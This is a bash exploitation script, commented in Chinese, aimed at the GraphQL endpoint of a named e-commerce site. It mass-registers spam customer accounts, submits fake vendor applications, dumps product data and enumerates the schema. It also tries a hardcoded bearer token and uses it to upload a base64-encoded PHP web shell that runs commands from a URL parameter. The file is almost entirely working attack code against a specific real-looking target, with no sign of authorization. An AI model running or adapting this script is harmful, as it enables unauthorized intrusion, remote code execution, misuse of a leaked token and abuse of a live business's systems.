#!/bin/bash
# GraphQL完整利用工具
# 自动化注册、数据枚举、批量操作

TARGET="https://oms.9to9.co.id/graphql"

show_banner() {
    echo "======================================"
    echo "  GraphQL Exploitation Tool"
    echo "  Target: oms.9to9.co.id"
    echo "======================================"
    echo ""
}

register_customer() {
    echo "[+] 注册Customer账号"
    EMAIL="test$(date +%s)@test.com"
    
    RESULT=$(curl -sk "$TARGET" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"mutation { createCustomer(input: {email: \\\"$EMAIL\\\", firstname: \\\"Test\\\", lastname: \\\"User\\\", password: \\\"Test@123\\\"}) { customer { email } } }\"}" \
        2>&1)
    
    if echo "$RESULT" | grep -q "$EMAIL"; then
        echo "[+] 成功注册: $EMAIL"
        echo "$EMAIL:Test@123" >> registered_accounts.txt
        return 0
    else
        echo "[-] 注册失败"
        echo "$RESULT"
        return 1
    fi
}

batch_register() {
    echo "[+] 批量注册账号"
    read -p "数量 (1-1000): " COUNT
    
    for i in $(seq 1 $COUNT); do
        EMAIL="spam$(date +%s)_$i@test.com"
        
        curl -sk "$TARGET" \
            -H "Content-Type: application/json" \
            -d "{\"query\":\"mutation { createCustomer(input: {email: \\\"$EMAIL\\\", firstname: \\\"Spam\\\", lastname: \\\"User$i\\\", password: \\\"Test@123\\\"}) { customer { email } } }\"}" \
            2>&1 | grep -q "email" && echo "[+] $EMAIL" || echo "[-] 失败"
        
        sleep 0.5
    done
}

enum_products() {
    echo "[+] 枚举产品数据"
    
    curl -sk "$TARGET" \
        -H "Content-Type: application/json" \
        -d '{"query":"{ products(search: \"\", pageSize: 100) { items { sku name price { regularPrice { amount { value currency } } } } total_count } }"}' \
        2>&1 | jq . > products_dump.json
    
    echo "[+] 数据已保存到 products_dump.json"
    echo "[+] 产品数量: $(jq -r '.data.products.total_count' products_dump.json)"
}

submit_vendor_request() {
    echo "[+] 提交Vendor申请"
    EMAIL="vendor$(date +%s)@test.com"
    
    curl -sk "$TARGET" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"mutation { addNewVendorRequest(input: {email: \\\"$EMAIL\\\", first_name: \\\"Test\\\", last_name: \\\"Vendor\\\", password: \\\"Test@123\\\", password_confirmation: \\\"Test@123\\\", company_name: \\\"TestCompany\\\"}) { status } }\"}" \
        2>&1 | jq .
    
    echo "[+] 申请已提交: $EMAIL"
}

test_token() {
    echo "[+] 测试现有Token"
    TOKEN="lu428yeg56c6r5ax1v3h522kuwict1kg"
    
    RESULT=$(curl -sk "$TARGET" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"query":"{ __typename }"}' \
        2>&1)
    
    if echo "$RESULT" | grep -q "Query"; then
        echo "[+] Token有效!"
        
        # 尝试上传
        echo "[+] 尝试文件上传"
        SHELL_B64=$(echo -n '<?php system($_GET["c"]); ?>' | base64)
        
        curl -sk "$TARGET" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"query\":\"mutation { vendorProductImageUpload(binary: \\\"$SHELL_B64\\\") { status_cpi message_cpi } }\"}" \
            2>&1 | jq .
    else
        echo "[-] Token无效或已过期"
    fi
}

enum_schema() {
    echo "[+] 枚举GraphQL Schema"
    
    echo "[+] Mutations:"
    curl -sk "$TARGET" \
        -d '{"query":"{ __type(name: \"Mutation\") { fields { name } } }"}' \
        2>&1 | jq -r '.data.__type.fields[].name' | head -20
    
    echo ""
    echo "[+] Queries:"
    curl -sk "$TARGET" \
        -d '{"query":"{ __schema { queryType { fields { name } } } }"}' \
        2>&1 | jq -r '.data.__schema.queryType.fields[].name' | head -20
}

show_menu() {
    echo ""
    echo "选择操作:"
    echo "1. 注册单个Customer账号"
    echo "2. 批量注册Customer账号"
    echo "3. 枚举产品数据"
    echo "4. 提交Vendor申请"
    echo "5. 测试已知Token并尝试上传"
    echo "6. 枚举GraphQL Schema"
    echo "7. 查看已注册账号"
    echo "0. 退出"
    echo ""
    read -p "选择 [0-7]: " CHOICE
    
    case $CHOICE in
        1) register_customer ;;
        2) batch_register ;;
        3) enum_products ;;
        4) submit_vendor_request ;;
        5) test_token ;;
        6) enum_schema ;;
        7) cat registered_accounts.txt 2>/dev/null || echo "暂无已注册账号" ;;
        0) echo "退出"; exit 0 ;;
        *) echo "无效选择" ;;
    esac
}

# 主程序
show_banner

while true; do
    show_menu
done
